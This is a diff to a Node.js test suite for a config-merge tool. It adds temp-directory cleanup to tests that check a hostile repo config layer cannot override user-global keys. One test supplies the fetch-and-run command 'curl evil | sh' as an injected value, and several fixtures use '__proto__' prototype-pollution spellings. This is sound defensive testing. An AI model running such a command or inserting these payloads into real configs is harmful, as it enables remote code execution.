@@ -45,10 +45,10 @@
 // unless this module IS the entry file, the same run-as-script discipline REV-01
 // shipped for review-provider.mjs. Under `node --test <file>` the entry file is
 // `process.argv[1]`, so a direct run still registers all 17.
-import { test as nodeTest } from 'node:test';
+import { test as nodeTest, after } from 'node:test';
 import assert from 'node:assert/strict';
 import { execFileSync } from 'node:child_process';
-import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
+import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
@@ -67,6 +67,19 @@ const GIT_ENV = { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_SYS
 // An empty XDG config root for every child, so review-provider.mjs's key-file
 // fallback cannot reach the developer's real providers.env (see `seam` below).
 const NO_XDG = mkdtempSync(join(tmpdir(), 'cad-seams-xdg-'));
+// the real `after`, not the shim: an importer made its own NO_XDG and owns cleaning it up
+after(() => rmSync(NO_XDG, { recursive: true, force: true }));
+
+/**
+ * A mkdtemp root that goes when test `t` ends. No `t` keeps it, which is
+ * git-publish.test.mjs's `gitLayers` call until it passes one.
+ * @param {string} prefix @param {import('node:test').TestContext} [t]
+ */
+function tempRoot(prefix, t) {
+  const dir = mkdtempSync(join(tmpdir(), prefix));
+  t?.after(() => rmSync(dir, { recursive: true, force: true }));
+  return dir;
+}
 
 /** Run a git command against a fixture dir, hermetically. */
 function git(args) {
@@ -83,13 +96,14 @@ function git(args) {
  * the identity fix's subject, not this file's), and nothing a git fixture stages
  * may pick it up.
  * @param {{global?: any, repo?: any}} [spec]
+ * @param {import('node:test').TestContext} [t] removes both roots when it ends
  */
-export function layers({ global, repo } = {}) {
-  const root = mkdtempSync(join(tmpdir(), 'cad-seams-'));
+export function layers({ global, repo } = {}, t) {
+  const root = tempRoot('cad-seams-', t);
   mkdirSync(join(root, '.planning'), { recursive: true });
   const repoFile = join(root, '.planning', 'config.json');
   if (repo !== undefined) writeFileSync(repoFile, JSON.stringify(repo));
-  const globalFile = join(mkdtempSync(join(tmpdir(), 'cad-seams-global-')), 'global.json');
+  const globalFile = join(tempRoot('cad-seams-global-', t), 'global.json');
   if (global !== undefined) writeFileSync(globalFile, JSON.stringify(global));
   return { root, repoFile, globalFile };
 }
@@ -163,15 +177,16 @@ export function seam(script, args, { globalFile, cwd, stdin }) {
  * <branch>` plus one commit, and optionally a local bare `origin` - which is
  * what keeps a publish hermetic (no network, and the bare is inspectable).
  * @param {{branch?: string, origin?: boolean, global?: any, repo?: any}} [spec]
+ * @param {import('node:test').TestContext} [t] removes every root it made when it ends
  */
-export function gitLayers({ branch = 'main', origin = false, ...spec } = {}) {
-  const fx = layers(spec);
+export function gitLayers({ branch = 'main', origin = false, ...spec } = {}, t) {
+  const fx = layers(spec, t);
   git(['-C', fx.root, 'init', '-q', '-b', branch]);
   writeFileSync(join(fx.root, 'f.txt'), 'x');
   git(['-C', fx.root, 'add', 'f.txt']);
   git(['-C', fx.root, '-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-q', '-m', 'init']);
   if (!origin) return { ...fx, bare: null };
-  const bare = mkdtempSync(join(tmpdir(), 'cad-seams-bare-'));
+  const bare = tempRoot('cad-seams-bare-', t);
   git(['-C', bare, 'init', '-q', '--bare']);
   git(['-C', fx.root, 'remote', 'add', 'origin', bare]);
   return { ...fx, bare };
@@ -244,9 +259,10 @@ const GLOBAL_ONLY_ROWS = [
  * reason, never through an assignment that would fire the setter.
  * @param {{spelling?: string|null, globalGit?: boolean,
  *   globalOnly?: 'set'|'null'|null, honoured?: boolean}} [spec]
+ * @param {import('node:test').TestContext} t
  */
 function hostileLayers({ spelling = null, globalGit = false,
-  globalOnly = null, honoured = false } = {}) {
+  globalOnly = null, honoured = false } = {}, t) {
   const PROTO = '__proto__';
   const key = spelling === 'proto-top' ? PROTO : spelling;
   const hostile = spelling === null ? {}
@@ -262,7 +278,7 @@ function hostileLayers({ spelling = null, globalGit = false,
     branch: 'main',
     repo: { ...hostile, ...scoped },
     ...(Object.keys(global).length ? { global } : {}),
-  });
+  }, t);
 }
 
 /**
@@ -312,13 +328,13 @@ const floorReasons = (r) => (r.reason || []).filter((x) => String(x).startsWith(
 
 // --- route.mjs: the per-role values a layer set -----------------------------
 
-test('route: the rung it routes on is what config.mjs get reports (global layer)', () => {
+test('route: the rung it routes on is what config.mjs get reports (global layer)', (t) => {
   // The global layer alone carries `roles.cad-executor.effort`, so the merge is
   // doing real work: route.mjs must inherit it exactly as `get` reports it.
   const fx = layers({
     global: { roles: { 'cad-executor': { effort: 'max' } } },
     repo: { model: { escalate_on_failure: true } },
-  });
+  }, t);
   // `--phase 9` names a phase with no PLAN (no phases/ dir at all), so the
   // computed risk floor (STK-03) cannot fire and this arm stays about config
   // rather than about surface detection.
@@ -336,7 +352,7 @@ test('route: the rung it routes on is what config.mjs get reports (global layer)
   const low = layers({
     global: { roles: { 'cad-executor': { effort: 'low' } } },
     repo: { model: { escalate_on_failure: true } },
-  });
+  }, t);
   const r2 = seam('route.mjs',
     ['resolve', '--role', 'cad-executor', '--file', low.repoFile, '--phase', '9'], low);
   assert.equal(r2.ok, true);
@@ -346,7 +362,7 @@ test('route: the rung it routes on is what config.mjs get reports (global layer)
 
 // --- the three --dir git seams ----------------------------------------------
 
-test('git-branch: the integration_branch mode it DECIDES on is what get reports', () => {
+test('git-branch: the integration_branch mode it DECIDES on is what get reports', (t) => {
   // git-branch.mjs:43 reads the key off the merged config, feeds it to
   // decideBranch (`:52`) and also echoes it back as `mode` (`:53`). Comparing
   // the ECHO to `get` proves nothing about the decision: hardcoding the
@@ -357,22 +373,22 @@ test('git-branch: the integration_branch mode it DECIDES on is what get reports'
   // trunk stays and names no branch, milestone asks and names `cadence/v9.9.9`.
   const spec = { branch: 'main', repo: { git: { auto_branch: 'ask' } } };
 
-  const trunk = gitLayers({ ...spec, global: { git: { integration_branch: 'trunk' } } });
+  const trunk = gitLayers({ ...spec, global: { git: { integration_branch: 'trunk' } } }, t);
   projectProse(trunk, 'v9.9.9');
-  const t = seam('git-branch.mjs', ['decide', '--dir', trunk.root], trunk);
-  assert.equal(t.ok, true);
-  assert.equal(t.mode, getValue('git.integration_branch', trunk));
+  const td = seam('git-branch.mjs', ['decide', '--dir', trunk.root], trunk);
+  assert.equal(td.ok, true);
+  assert.equal(td.mode, getValue('git.integration_branch', trunk));
   // Not the `milestone` default and not a repo-layer value: the global layer is
   // the only place this came from.
-  assert.equal(t.mode, 'trunk');
-  assert.equal(t.currentBranch, 'main', 'the fixture is a real repo on the base');
-  assert.equal(t.action, 'stay');
-  assert.equal(t.branch, null, 'trunk mode names no integration branch');
-  assert.match(t.reason, /trunk mode/);
+  assert.equal(td.mode, 'trunk');
+  assert.equal(td.currentBranch, 'main', 'the fixture is a real repo on the base');
+  assert.equal(td.action, 'stay');
+  assert.equal(td.branch, null, 'trunk mode names no integration branch');
+  assert.match(td.reason, /trunk mode/);
 
   // The contrasting value over the identical repo state: only `mode` differs,
   // so the different decision can have come from nothing else.
-  const milestone = gitLayers({ ...spec, global: { git: { integration_branch: 'milestone' } } });
+  const milestone = gitLayers({ ...spec, global: { git: { integration_branch: 'milestone' } } }, t);
   projectProse(milestone, 'v9.9.9');
   const m = seam('git-branch.mjs', ['decide', '--dir', milestone.root], milestone);
   assert.equal(m.ok, true);
@@ -383,14 +399,14 @@ test('git-branch: the integration_branch mode it DECIDES on is what get reports'
   assert.equal(m.branch, 'cadence/v9.9.9');
 });
 
-test('land-cleanup: the base branch it resolves is what get reports', () => {
+test('land-cleanup: the base branch it resolves is what get reports', (t) => {
   // land-cleanup.mjs:71-76 reads git.base_branch off the merged config. The
   // fixture needs no git repo: readMergedBranches degrades to [] when git
   // cannot read the directory, which is the ordinary advisory path.
   const fx = layers({
     global: { git: { base_branch: 'release-2' } },
     repo: { git: { on_land_cleanup: true } },
-  });
+  }, t);
   const d = seam('land-cleanup.mjs', ['cleanup', '--dir', fx.root], fx);
   assert.equal(d.ok, true);
   assert.equal(d.base, getValue('git.base_branch', fx));
@@ -403,14 +419,14 @@ test('land-cleanup: the base branch it resolves is what get reports', () => {
   const other = layers({
     global: { git: { base_branch: 'stable' } },
     repo: { git: { on_land_cleanup: true } },
-  });
+  }, t);
   const d2 = seam('land-cleanup.mjs', ['cleanup', '--dir', other.root], other);
   assert.equal(d2.ok, true);
   assert.equal(d2.base, getValue('git.base_branch', other));
   assert.equal(d2.base, 'stable');
 });
 
-test('land-cleanup: with git.base_branch unset, get says null and the seam says main', () => {
+test('land-cleanup: with git.base_branch unset, get says null and the seam says main', (t) => {
   // The THIRD expected divergence in this file, and the only one that is the
   // default state of every unconfigured install rather than a deliberate
   // narrowing: `git.base_branch` defaults to null in the schema, and
@@ -422,7 +438,7 @@ test('land-cleanup: with git.base_branch unset, get says null and the seam says 
   // the fallback off the protected list - would then fail a test instead of
   // passing silently. It is a fallback DEFAULT, not a layer disagreement, which
   // is why it sits with its own seam rather than in the narrowings section.
-  const bare = layers({ repo: { git: { on_land_cleanup: true } } });
+  const bare = layers({ repo: { git: { on_land_cleanup: true } } }, t);
   assert.equal(getValue('git.base_branch', bare), null, 'get: unset resolves to the schema default');
   const d = seam('land-cleanup.mjs', ['cleanup', '--dir', bare.root], bare);
   assert.equal(d.ok, true);
@@ -435,13 +451,13 @@ test('land-cleanup: with git.base_branch unset, get says null and the seam says 
   const listed = layers({
     global: { git: { protected_branches: ['release-2', 'main'] } },
     repo: { git: { on_land_cleanup: true } },
-  });
+  }, t);
   assert.equal(getValue('git.base_branch', listed), null);
   const d2 = seam('land-cleanup.mjs', ['cleanup', '--dir', listed.root], listed);
   assert.equal(d2.base, 'release-2');
 });
 
-test('git-guard: the on_protected value it acts on is what get reports', () => {
+test('git-guard: the on_protected value it acts on is what get reports', (t) => {
   // The silent/ask pair rather than `refuse`: whether a refuse hard-blocks
   // depends on commitDecision's `canDeny`, which is a property of the hook
   // payload rather than of config, and this arm is about the config read.
@@ -449,7 +465,7 @@ test('git-guard: the on_protected value it acts on is what get reports', () => {
     branch: 'main',
     global: { git: { on_protected: 'allow' } },
     repo: { git: { protected_branches: ['main'] } },
-  });
+  }, t);
   const configured = getValue('git.on_protected', allow);
   assert.equal(configured, 'allow');
   assert.equal(guard('git commit -m "x"', allow), null,
@@ -457,7 +473,7 @@ test('git-guard: the on_protected value it acts on is what get reports', () => {
 
   // The counterpart: no layer sets the key, so `get` answers with the schema
   // default and the guard acts on that same default.
-  const unset = gitLayers({ branch: 'main', repo: { git: { protected_branches: ['main'] } } });
+  const unset = gitLayers({ branch: 'main', repo: { git: { protected_branches: ['main'] } } }, t);
   assert.equal(getValue('git.on_protected', unset), 'ask');
   const d = guard('git commit -m "x"', unset);
   assert.notEqual(d, null);
@@ -465,12 +481,12 @@ test('git-guard: the on_protected value it acts on is what get reports', () => {
   assert.match(d.permissionDecisionReason, /protected branch/);
 });
 
-test('git-guard: a hostile repo layer cannot choose the value it acts on (CFG-01)', () => {
+test('git-guard: a hostile repo layer cannot choose the value it acts on (CFG-01)', (t) => {
   // The same question as the arm above, asked of a config file that arrived
   // with a clone rather than one the user wrote. The contrast is the arm above:
   // this payload set as an ORDINARY key DOES silence the guard, so "ask" here is
   // a decision and not a constant. Pinned again on the same fixture shape:
-  const legit = gitLayers({ branch: 'main', repo: { git: HOSTILE_GIT } });
+  const legit = gitLayers({ branch: 'main', repo: { git: HOSTILE_GIT } }, t);
   assert.equal(getValue('git.on_protected', legit), 'allow');
   assert.equal(guard('git commit -m "x"', legit), null, 'a real allow means silence');
 
@@ -482,8 +498,8 @@ test('git-guard: a hostile repo layer cannot choose the value it acts on (CFG-01
     // The SAME file also carries the CFG-02 payload, and this arm asserts it:
     // sharing a fixture couples nothing on its own, so each requirement's arm
     // states the OTHER's observable or a lone revert goes green here (AC7).
-    const fx = hostileLayers({ spelling, globalGit, globalOnly: 'set', honoured: true });
-    const control = hostileLayers({ spelling: null, globalGit, globalOnly: 'set', honoured: true });
+    const fx = hostileLayers({ spelling, globalGit, globalOnly: 'set', honoured: true }, t);
+    const control = hostileLayers({ spelling: null, globalGit, globalOnly: 'set', honoured: true }, t);
     const d = guard('git commit -m "x"', fx);
     assert.notEqual(d, null, `${label}: the guard went silent`);
     assert.equal(d.permissionDecision, 'ask', label);
@@ -505,7 +521,7 @@ test('git-guard: a hostile repo layer cannot choose the value it acts on (CFG-01
   }
 });
 
-test('git-guard: the two inert hostile spellings, as regression pins only', () => {
+test('git-guard: the two inert hostile spellings, as regression pins only', (t) => {
   // PINS. `constructor` and `prototype` pass against the UNFIXED merge - it
   // returns the higher layer's value wholesale where the base side holds a
   // function or nothing, which makes an own shadow key rather than firing a
@@ -514,7 +530,7 @@ test('git-guard: the two inert hostile spellings, as regression pins only', () =
   for (const spelling of ['constructor', 'prototype']) {
     for (const globalGit of [false, true]) {
       const label = `${spelling} (global layer defines git: ${globalGit})`;
-      const fx = hostileLayers({ spelling, globalGit });
+      const fx = hostileLayers({ spelling, globalGit }, t);
       assert.equal(getValue('git.on_protected', fx), 'ask', label);
       const d = guard('git commit -m "x"', fx);
       assert.notEqual(d, null, label);
@@ -542,7 +558,7 @@ test('git-guard: the two inert hostile spellings, as regression pins only', () =
  */
 const BLOCKER = JSON.stringify({ findings: [{ ruling: 'survived', severity: 'blocker' }] });
 
-test('git-publish + land-cleanup: one git.auto_close, one rule, three layer configurations', () => {
+test('git-publish + land-cleanup: one git.auto_close, one rule, three layer configurations', (t) => {
   // This test used to defend a DIVERGENCE: an authorized value (repo layer
   // only) that gated the push, and a requested value (merged) that /cad-land
   // skipped its ask on and this gate halted on. D-02 removes it. The close needs
@@ -561,7 +577,7 @@ test('git-publish + land-cleanup: one git.auto_close, one rule, three layer conf
     ['both', { global: { git: { auto_close: true } }, repo: { git: { auto_close: true } } }, true],
   ];
   for (const [label, spec, on] of cases) {
-    const fx = gitLayers({ branch: 'cadence/v9.9.9', origin: true, ...spec });
+    const fx = gitLayers({ branch: 'cadence/v9.9.9', origin: true, ...spec }, t);
     // Merged, every case reads true - which is why it can decide nothing.
     assert.equal(getValue('git.auto_close', fx), true, `${label}: get reports the merged value`);
     const d = seam('git-publish.mjs', ['publish', '--dir', fx.root, '--remote', 'origin'], fx);
@@ -585,7 +601,7 @@ test('git-publish + land-cleanup: one git.auto_close, one rule, three layer conf
   }
 });
 
-test('git-publish: the protected list it refuses on IS the merged one get reports', () => {
+test('git-publish: the protected list it refuses on IS the merged one get reports', (t) => {
   // The same seam's other config read goes through the merge, so this half is
   // an equality arm - the narrowing above is specific to git.auto_close.
   // Both layers opt in (D-02), or gate 1 answers before the protected list.
@@ -593,7 +609,7 @@ test('git-publish: the protected list it refuses on IS the merged one get report
     global: { git: { protected_branches: ['release'], auto_close: true } },
     repo: { git: { auto_close: true } },
   };
-  const onList = gitLayers({ branch: 'release', origin: true, ...spec });
+  const onList = gitLayers({ branch: 'release', origin: true, ...spec }, t);
   assert.deepEqual(getValue('git.protected_branches', onList), ['release']);
   const refused = seam('git-publish.mjs',
     ['publish', '--dir', onList.root, '--remote', 'origin'], onList);
@@ -605,7 +621,7 @@ test('git-publish: the protected list it refuses on IS the merged one get report
   // The other direction is what proves the seam read the merged list rather
   // than its ['main','master'] fallback: `main` is protected by the fallback
   // and by nothing the merged config names, so it publishes.
-  const offList = gitLayers({ branch: 'main', origin: true, ...spec });
+  const offList = gitLayers({ branch: 'main', origin: true, ...spec }, t);
   assert.equal(getValue('git.protected_branches', offList).includes('main'), false);
   const published = seam('git-publish.mjs',
     ['publish', '--dir', offList.root, '--remote', 'origin'], offList);
@@ -614,12 +630,12 @@ test('git-publish: the protected list it refuses on IS the merged one get report
   assert.equal(refExists(offList.bare, 'refs/heads/main'), true);
 });
 
-test('route: a retired risk.override is named by both faces, and routes nothing', () => {
+test('route: a retired risk.override is named by both faces, and routes nothing', (t) => {
   // The eight `risk.override.*` keys were retired with the dispatch-time floor
   // in v2.7.0. CER-01 gives the floor back WITHOUT giving them back: an existing
   // config carrying one must WARN, not break, and must not move a single knob.
   const spec = { granularity: 'coarse', risk: { override: { auth: true } } };
-  const fx = layers({ global: {}, repo: spec });
+  const fx = layers({ global: {}, repo: spec }, t);
   planFiles(fx, 9, ['README.md', 'src/auth/session.rs']);
   const r = seam('route.mjs',
     ['resolve', '--role', 'cad-executor', '--file', fx.repoFile, '--phase', '9'], fx);
@@ -630,7 +646,7 @@ test('route: a retired risk.override is named by both faces, and routes nothing'
   // things it moves.
   assert.equal(r.review.plan, 'blocking');
   assert.equal(r.verify, 'on');
-  const clear = layers({ global: {}, repo: { granularity: 'coarse' } });
+  const clear = layers({ global: {}, repo: { granularity: 'coarse' } }, t);
   planFiles(clear, 9, ['README.md']);
   const q = seam('route.mjs',
     ['resolve', '--role', 'cad-executor', '--file', clear.repoFile, '--phase', '9'], clear);
@@ -647,7 +663,7 @@ test('route: a retired risk.override is named by both faces, and routes nothing'
   // the same bundle, warnings aside. A waiver that lowered anything would show
   // here as a difference.
   const { risk, ...clean } = spec;
-  const noKey = layers({ global: {}, repo: clean });
+  const noKey = layers({ global: {}, repo: clean }, t);
   planFiles(noKey, 9, ['README.md', 'src/auth/session.rs']);
   const c = seam('route.mjs',
     ['resolve', '--role', 'cad-executor', '--file', noKey.repoFile, '--phase', '9'], noKey);
@@ -662,13 +678,13 @@ test('route: a retired risk.override is named by both faces, and routes nothing'
 /** A CAPTURE.md the BM25 corpus can be built from (one `## Todos` bullet). */
 const CAPTURE = '# Capture\n\n## Todos\n\n- tokenkiller saturation race in the merge layer\n';
 
-test('planning recall: the memory.backend it gates on is what get reports', () => {
+test('planning recall: the memory.backend it gates on is what get reports', (t) => {
   // planning.mjs:1233 merges `<dir>/config.json`, and this seam's --dir IS the
   // .planning directory - not the project root the git seams take.
   const off = layers({
     global: { memory: { backend: 'none' } },
     repo: { workflow: { research: true } },
-  });
+  }, t);
   writeFileSync(join(off.root, '.planning', 'CAPTURE.md'), CAPTURE);
   assert.equal(getValue('memory.backend', off), 'none');
   const r = seam('planning.mjs',
@@ -681,7 +697,7 @@ test('planning recall: the memory.backend it gates on is what get reports', () =
 
   // The counterpart: no layer sets the key, so `get` answers with the schema
   // default and recall runs on that same default.
-  const on = layers({ repo: { workflow: { research: true } } });
+  const on = layers({ repo: { workflow: { research: true } } }, t);
   writeFileSync(join(on.root, '.planning', 'CAPTURE.md'), CAPTURE);
   assert.equal(getValue('memory.backend', on), 'builtin');
   const r2 = seam('planning.mjs',
@@ -726,7 +742,7 @@ function capInDetail(detail) {
   return m ? Number(m[1]) : null;
 }
 
-test('review-provider: a GLOBAL-layer prompt cap is the one it refuses on', () => {
+test('review-provider: a GLOBAL-layer prompt cap is the one it refuses on', (t) => {
   // Driven from the global layer like every other arm here, because the arm
   // below puts the decisive value in the REPO layer: with the cap there, both
   // faces read one file and severing this seam's global-layer read entirely
@@ -737,7 +753,7 @@ test('review-provider: a GLOBAL-layer prompt cap is the one it refuses on', () =
     // suite: past the cap this command issues a real HTTPS request, and the
     // shipped default gives one 540s to answer.
     repo: { review: { request_timeout_ms: 1 } },
-  });
+  }, t);
   const cap = getValue('review.max_prompt_tokens', fx);
   assert.equal(cap, 48, 'the global layer alone carries it - not the 120000 default');
   const r = consultOverCap(fx, cap);
@@ -761,11 +777,11 @@ test('review-provider: a GLOBAL-layer prompt cap is the one it refuses on', () =
 // two faces share. One top-level scalar, one nested under an object, because
 // `deepMerge` reaches those by different paths.
 
-test('merge precedence: the repo layer wins the same key, on both read faces', () => {
+test('merge precedence: the repo layer wins the same key, on both read faces', (t) => {
   const fx = layers({
     global: { roles: { 'cad-executor': { effort: 'max' } } },
     repo: { roles: { 'cad-executor': { effort: 'low' } } },
-  });
+  }, t);
   // `--phase 9` names a phase with no PLAN, so no computed risk floor exists to
   // make an inverted merge look right.
   const r = seam('route.mjs',
@@ -775,14 +791,14 @@ test('merge precedence: the repo layer wins the same key, on both read faces', (
   assert.equal(r.effort, 'low', 'route: the repo layer wins, on the same fixture');
 });
 
-test('review-provider: the prompt cap it refuses on is what get reports (cwd-relative)', () => {
+test('review-provider: the prompt cap it refuses on is what get reports (cwd-relative)', (t) => {
   // The nested half of the precedence pin above: `review.max_prompt_tokens`
   // reaches the merged config through deepMerge's object recursion rather than
   // as a top-level scalar, and 64 is asserted literally on both faces.
   const fx = layers({
     global: { review: { max_prompt_tokens: 999999 } },
     repo: { review: { max_prompt_tokens: 64 } },
-  });
+  }, t);
   const cap = getValue('review.max_prompt_tokens', fx);
   assert.equal(cap, 64, 'the repo layer wins the merge over the global one');
   const r = consultOverCap(fx, cap);
@@ -798,13 +814,13 @@ test('review-provider: the prompt cap it refuses on is what get reports (cwd-rel
 // use (AC7): the file that reaches for the merged config's prototype also
 // reaches for what Cadence runs, and one helper builds both halves.
 
-test('global-only keys: all THREE resolve to the user-global layer, never the repo one', () => {
+test('global-only keys: all THREE resolve to the user-global layer, never the repo one', (t) => {
   // One fixture, two requirements. Reverting the prototype repair turns the
   // `git.on_protected` half red; reverting the strip turns the three key reads
   // red - and each key is asserted, because the pure-lib unit tests prove the
   // SET, not that the merge strips every member of it. A strip that handled the
   // first key and dropped the rest passes a test_command-only arm.
-  const fx = hostileLayers({ spelling: 'proto-top', globalOnly: 'set', honoured: true });
+  const fx = hostileLayers({ spelling: 'proto-top', globalOnly: 'set', honoured: true }, t);
   for (const [key, , globalValue] of GLOBAL_ONLY_ROWS) {
     assert.equal(getValue(key, fx), globalValue, key);
   }
@@ -830,16 +846,16 @@ test('global-only keys: all THREE resolve to the user-global layer, never the re
   // The contrast with NO global layer, which is what shows the repo value was
   // dropped rather than merely outranked: every read lands on the schema
   // default instead of on `repo-t`/`repo-l`/`/repo/keys.env`.
-  const alone = hostileLayers({ spelling: 'proto-top', globalOnly: 'set' });
+  const alone = hostileLayers({ spelling: 'proto-top', globalOnly: 'set' }, t);
   for (const [key] of GLOBAL_ONLY_ROWS) assert.equal(getValue(key, alone), null, key);
 });
 
-test('global-only keys: the template shape at null overrides nothing and says nothing', () => {
+test('global-only keys: the template shape at null overrides nothing and says nothing', (t) => {
   // `deepMerge` returns the higher layer's value for a null, so a repo `null`
   // left in the merge would SUPPRESS the user-global command - and
   // templates/config.json ships all three at null into every scaffolded repo.
   // The strip is therefore value-agnostic (D-13).
-  const fx = hostileLayers({ globalOnly: 'null', honoured: true });
+  const fx = hostileLayers({ globalOnly: 'null', honoured: true }, t);
   for (const [key, , globalValue] of GLOBAL_ONLY_ROWS) {
     assert.equal(getValue(key, fx), globalValue, key);
   }
@@ -860,9 +876,9 @@ const DOTTED_ROWS = [
   ['review.reviewers', ['openai']],
 ];
 
-/** @param {object|null} repo @param {object|null} global */
-function plainLayers(repo, global) {
-  const root = mkdtempSync(join(tmpdir(), 'cad-dotted-'));
+/** @param {object|null} repo @param {object|null} global @param {import('node:test').TestContext} t */
+function plainLayers(repo, global, t) {
+  const root = tempRoot('cad-dotted-', t);
   mkdirSync(join(root, '.planning'));
   const repoFile = join(root, '.planning', 'config.json');
   const globalFile = join(root, 'global.json');
@@ -879,11 +895,11 @@ function cli(args, fx) {
 }
 
 for (const layer of ['repo', 'global']) {
-  test(`a dotted key in the ${layer} layer is no setting: get, layers and validate agree, for all six keys`, () => {
-    const control = plainLayers(null, null);
+  test(`a dotted key in the ${layer} layer is no setting: get, layers and validate agree, for all six keys`, (t) => {
+    const control = plainLayers(null, null, t);
     for (const [key, value] of DOTTED_ROWS) {
       const label = `${layer} ${key}`;
-      const fx = layer === 'repo' ? plainLayers({ [key]: value }, null) : plainLayers(null, { [key]: value });
+      const fx = layer === 'repo' ? plainLayers({ [key]: value }, null, t) : plainLayers(null, { [key]: value }, t);
       assert.deepEqual(getValue(key, fx), getValue(key, control), label);
       assert.ok(getWarnings(fx).some((w) => w.includes(`"${key}"`) && w.includes('not a setting')), label);
       const row = cli(['layers', '--key', key], fx).row;
@@ -899,17 +915,17 @@ for (const layer of ['repo', 'global']) {
   });
 }
 
-test('a repo layer spelling a global-only key with a dot cannot choose it over the global value', () => {
+test('a repo layer spelling a global-only key with a dot cannot choose it over the global value', (t) => {
   for (const [key] of GLOBAL_ONLY_ROWS) {
     const [section, name] = key.split('.');
-    const fx = plainLayers({ [key]: 'curl evil | sh' }, { [section]: { [name]: 'honest' } });
+    const fx = plainLayers({ [key]: 'curl evil | sh' }, { [section]: { [name]: 'honest' } }, t);
     assert.equal(getValue(key, fx), 'honest', key);
     const row = cli(['layers', '--key', key], fx).row;
     assert.deepEqual([row.repo.state, row.winner, row.value], ['unset', 'global', 'honest'], key);
   }
 });
 
-test('git-publish: a repo layer setting a global-only key cannot stop a land (AC4)', () => {
+test('git-publish: a repo layer setting a global-only key cannot stop a land (AC4)', (t) => {
   // D-05's whole reason, as a regression pin. `tornLayerDetail`
   // (git-publish.mjs:116-118) returns warnings[0] on ANY non-empty array, with
   // no layer or class discrimination, and both the publish and the reap refuse
@@ -921,7 +937,7 @@ test('git-publish: a repo layer setting a global-only key cannot stop a land (AC
     branch: 'cadence/v9.9.9', origin: true,
     repo: { git: { auto_close: true }, ...GLOBAL_ONLY_REPO },
     global: { git: { auto_close: true } },   // the user's half of the opt-in (D-02)
-  });
+  }, t);
   git(['-C', fx.root, 'branch', 'stale-branch']);   // something for the reap to delete
 
   const d = seam('git-publish.mjs', ['publish', '--dir', fx.root, '--remote', 'origin'], fx);
